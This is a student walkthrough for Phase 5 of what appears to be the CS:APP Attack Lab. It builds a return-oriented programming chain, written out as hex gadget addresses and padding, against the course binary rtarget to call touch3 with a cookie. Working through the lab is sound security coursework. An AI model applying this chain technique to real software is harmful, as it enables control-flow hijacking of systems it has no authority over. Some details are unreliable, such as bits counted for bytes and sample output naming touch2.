Phase 5 is NOT WORTH the effort for 5 points. If you are an overachiever or someone with too much time on thier hands like myself then go for it. Same as Phase 4, we can't execute code for the following reasons:

1. Stack randomization -- you can't simply point your injected code to a fixed address on the stack and run your explit code
2. Non-executeble memory block. This feature prevents you from executing instructions on the machine because the memory block is marked as non-executable.

Again, the solution for this is to use ROP (Return Oriented Programming). Except it's harder this time because we can't directly obtain the desired optcodes and require several optcodes to do the same task.

As before, we will be using the program rtarget instead of ctarget

This phase is the same as phase 3 except you are using different exploit method to call touch3 and pass your cookie. This phase can be done with a minimum of 9/10 optcodes depending on the specific target obtained. Some of which are hidden/disguised by nop codes so be careful.

First things first, put in the buffer from phase4
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
```
Great! Now we need to put the cookie at rsp so then we can move its address into rax. This can be done by 

```
48 89 e0 c3	movq %rsp, %rax 
```

These optcodes can be found in the code farm dictated by the start farm and end farm comments in the binary. My particular address was: a1 5d 55 55 55 55 00 00. Remember to add/subtract the offset! Next copy rax into rdi.

```
48 89 c7 c3	movq %rax, %rdi
```

My address was 73 5d 55 55 55 55 00 00.

Next, find pop %rax which you may remember is 58 c3 from phase 4. Then leave a row of zeros such that your current product looks like so: 
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	//end buffer
a1 5d 55 55 55 55 00 00	//rsp -> rax
73 5d 55 55 55 55 00 00	//rax -> rdi
62 5d 55 55 55 55 00 00 //My address for pop rax
00 00 00 00 00 00 00 00 //empty row of zeros
```

Now here begins the hard part...

Copy eax into esi. But if you look for the code you'll notice that it doesnt exist. Soooooo... you have to use some middle men. This takes forever because I do not know any way that does not involve doing through every possible combination. What makes it worse is if you do not find the optcode next to a c3 code, it is very likely that nop codes are inbetween them. 

Make sure you double check everything!

Anyway, what worked for me was:

```
89 c2	movl %eax, %edx
89 d1	movl %edx, %ecx
89 ce	movl %ecx, %esi

There may be more or less "middle men" for each target file.
```

Next, get the address of add_xy which should be in every target.

So now our answers file looks like:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	//end buffer
a1 5d 55 55 55 55 00 00	//rsp -> rax
73 5d 55 55 55 55 00 00	//rax -> rdi
62 5d 55 55 55 55 00 00 //My address for pop rax
00 00 00 00 00 00 00 00 //empty row of zeros
93 5d 55 55 55 55 00 00 //eax -> edx
12 5e 55 55 55 55 00 00 //edx -> ecx
c3 5d 55 55 55 55 00 00 //ecx -> esi
8c 5d 55 55 55 55 00 00 //lea add_xy
```
Awesome, now the hard part is done!
Next, use the rax -> rdi address again.

'''
73 5d 55 55 55 55 00 00	//rax -> rdi
'''

Copy the address of touch3 in the rtarget file and then use string version of the cookie from phase 3.

```
ae 5c 55 55 55 55 00 00 //touch 3 address
33 65 38 64 65 65 38 66 //cookie as string
```

Now our answer file is almost done!

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	//end buffer
a1 5d 55 55 55 55 00 00	//rsp -> rax
73 5d 55 55 55 55 00 00	//rax -> rdi
62 5d 55 55 55 55 00 00 //My address for pop rax
00 00 00 00 00 00 00 00 //empty row of zeros
93 5d 55 55 55 55 00 00 //eax -> edx
12 5e 55 55 55 55 00 00 //edx -> ecx
c3 5d 55 55 55 55 00 00 //ecx -> esi
8c 5d 55 55 55 55 00 00 //lea add_xy
73 5d 55 55 55 55 00 00	//rax -> rdi
ae 5c 55 55 55 55 00 00 //touch 3 address
33 65 38 64 65 65 38 66 //cookie as string
```
But what about the extra row of zeros?

That is actually our own buffer for our optcodes. So we need to have enough space for the empty row to the touch 3 address. In my case there are only 6 rows of 8 bits so 48 bits of space. 

Note: Sometimes you have to add an extra bit at the end of the cookie string and increment the buffer depending on the target.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	
a1 5d 55 55 55 55 00 00	
73 5d 55 55 55 55 00 00	
62 5d 55 55 55 55 00 00 
48 00 00 00 00 00 00 00 //1
93 5d 55 55 55 55 00 00 //2
12 5e 55 55 55 55 00 00 //3
c3 5d 55 55 55 55 00 00 //4
8c 5d 55 55 55 55 00 00 //5
73 5d 55 55 55 55 00 00	//6
ae 5c 55 55 55 55 00 00 //touch 3 address
33 65 38 64 65 65 38 66 //cookie as string

6 * 8 = 48
```

Finally, you run the raw file (remember you are running it on rtarget, not ctarget)


`cat phase5.txt | ./hex2raw ./rtarget`


You should get something like below:

```
Type string:Touch3!: You called touch2(0xaddress)
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

